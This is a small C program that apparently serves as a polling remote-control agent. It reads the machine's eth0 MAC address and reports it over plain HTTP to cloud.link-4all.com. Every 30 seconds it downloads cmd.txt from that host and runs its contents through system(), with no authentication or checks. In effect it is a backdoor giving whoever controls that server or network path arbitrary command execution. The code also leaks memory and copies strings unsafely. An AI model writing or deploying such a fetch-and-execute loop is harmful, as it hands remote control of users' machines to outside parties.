#include <stdio.h>  
#include <string.h> 
#include <stdlib.h>

#include   <sys/ioctl.h> 
#include   <sys/socket.h> 
#include   <netinet/in.h> 
#include   <net/if.h> 

#define MAXLEN 1024
char *mac;

int  readmac( char   *ethchar, char *macaddr) 
{ 

    struct   ifreq   ifreq; 
    int   sock; 

  
    if((sock=socket(AF_INET,SOCK_STREAM,0)) <0) 
    { 
        perror( "socket "); 
        return   2; 
    } 
    strcpy(ifreq.ifr_name,ethchar); 
    if(ioctl(sock,SIOCGIFHWADDR,&ifreq) <0) 
    { 
        perror( "ioctl "); 
        return   3; 
    } 
    sprintf( macaddr,"%02x:%02x:%02x:%02x:%02x:%02x", 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[0], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[1], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[2], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[3], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[4], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[5]); 
    return   0; 
} 

int read_file(char *filename, char *dest, int maxlen)  
{  
 	FILE *file;  
 	int pos, temp, i; 
 //打开文件  
 	file = fopen(filename, "r");  
 	if( NULL == file )  
 		{  
  		fprintf(stderr, "open %s error\n", filename);  
  		return -1;  
 		} 

 	pos = 0;  
 //循环读取文件中的内容  
 	for(i=0; i<MAXLEN-1; i++)  
	 {  
  		temp = fgetc(file);  
  		if( EOF == temp )  
   		break;  
  		dest[pos++] = temp;  
 	}  
 //关闭文件
 	fclose(file);
 //在数组末尾加0  
 	dest[pos] = 0; 

 return pos;  
} 


int main()
{ 	char *ifacename;
	ifacename=(char *)malloc(8*sizeof(char));
	ifacename="eth0";
	mac=(char *)malloc(18*sizeof(char));
	readmac(ifacename,mac);
	printf("%s\n",mac );
	while(1)
	{
	char *getmac;
	getmac=(char *)malloc(256*sizeof(char));
	sprintf(getmac,"wget http://cloud.link-4all.com/mac.php?mac=%s -O /tmp/mac.txt",mac);
	system(getmac);
	system("wget http://cloud.link-4all.com/cmd.txt -O /tmp/cmd.txt");
	char *buff;
	buff=(char *)malloc(MAXLEN*sizeof(char));
	read_file("/tmp/cmd.txt",buff,MAXLEN);
	//printf("%s\n",buff);
	system(buff);
/*    	char *p;
    	p = strtok(buff, "|");
    	while(p)
    	{	
    		printf("%s\n",p);
		char pp[64];
		sprintf(pp,"wget http://cloud.link-4all.com/%s -O ./%s",p,p);
		system(pp);
		p=strtok(NULL,"|");
		
    	}*/
    	free(buff);
    	sleep(30);
	}
//printf("ok\n\n");

return 0;
}
